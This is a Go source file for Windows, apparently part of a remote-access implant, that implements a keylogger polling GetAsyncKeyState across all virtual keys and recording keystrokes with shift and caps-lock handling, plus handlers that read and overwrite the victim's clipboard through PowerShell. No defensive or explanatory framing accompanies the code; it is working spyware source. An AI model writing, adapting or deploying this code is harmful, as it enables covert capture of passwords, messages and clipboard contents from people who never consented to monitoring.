//go:build windows

package main

import (
	"strings"
	"syscall"
	"time"
	"unicode"
)

func (k *keyLogger) capture() {
	user32 := syscall.NewLazyDLL("user32.dll")
	getAsyncKeyState := user32.NewProc("GetAsyncKeyState")
	keyNames := map[int]string{
		0x0D: "[Enter]", 0x09: "[Tab]", 0x1B: "[Esc]",
		0x20: "[Space]", 0x08: "[BS]", 0x2E: "[Del]",
		0x25: "[Left]", 0x26: "[Up]", 0x27: "[Right]", 0x28: "[Down]",
		0x2D: "[Ins]", 0x23: "[End]", 0x24: "[Home]",
		0x5B: "[LWin]", 0x5C: "[RWin]",
	}
	prev := make(map[int]bool)
	for k.isRunning() {
		for vk := 8; vk <= 255; vk++ {
			ret, _, _ := getAsyncKeyState.Call(uintptr(vk))
			pressed := ret&0x8000 != 0
			wasPrev := prev[vk]
			prev[vk] = pressed
			if pressed && !wasPrev {
				if name, ok := keyNames[vk]; ok {
					k.append(name)
				} else if vk >= 0x30 && vk <= 0x39 {
					k.append(string(rune(vk)))
				} else if vk >= 0x41 && vk <= 0x5A {
					shift, _, _ := getAsyncKeyState.Call(uintptr(0x10))
					capsLock, _, _ := getAsyncKeyState.Call(uintptr(0x14))
					upper := (shift&0x8000 != 0) != (capsLock&0x1 != 0)
					c := rune(vk)
					if !upper {
						c = unicode.ToLower(c)
					}
					k.append(string(c))
				} else if vk >= 0x60 && vk <= 0x69 {
					k.append(string(rune('0' + vk - 0x60)))
				}
			}
		}
		time.Sleep(time.Millisecond * keylogPollIntervalMs)
	}
}

func clipboardGet() (string, int) {
	out, err := runCmd("powershell", "-command", "Get-Clipboard")
	if err != nil {
		return "error: " + err.Error(), 1
	}
	return strings.TrimSpace(out), 0
}

func clipboardSet(text string) (string, int) {
	escaped := strings.ReplaceAll(text, "'", "''")
	_, err := runCmd("powershell", "-command", "Set-Clipboard -Value '"+escaped+"'")
	if err != nil {
		return "error: " + err.Error(), 1
	}
	return "clipboard set", 0
}
